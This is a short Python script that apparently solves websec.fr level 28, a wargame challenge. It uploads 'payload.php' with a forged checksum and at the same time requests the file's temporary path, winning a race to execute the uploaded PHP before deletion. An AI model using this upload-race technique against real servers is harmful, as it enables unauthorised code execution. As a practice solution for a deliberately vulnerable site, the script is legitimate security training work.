import asyncio
import aiohttp

ip_to_md5 = '44eee898e3af05964a190435d1fc20b3'


async def upload_payload():
    async with aiohttp.ClientSession() as session:
        data = aiohttp.FormData()
        data.add_field('flag_file', open(r'./payload.php', 'rb'), filename='payload.php')
        data.add_field('checksum', '0')
        data.add_field('submit', 'Upload and check')
        async with session.post('https://websec.fr/level28/index.php', data=data) as resp:
            await resp.text()


async def trigger_payload():
    await asyncio.sleep(0.05)
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://websec.fr/level28/tmp/{ip_to_md5}.php') as resp:
            x = await resp.text()
            print(x)


async def main():
    await asyncio.gather(upload_payload(), trigger_payload())


asyncio.run(main())
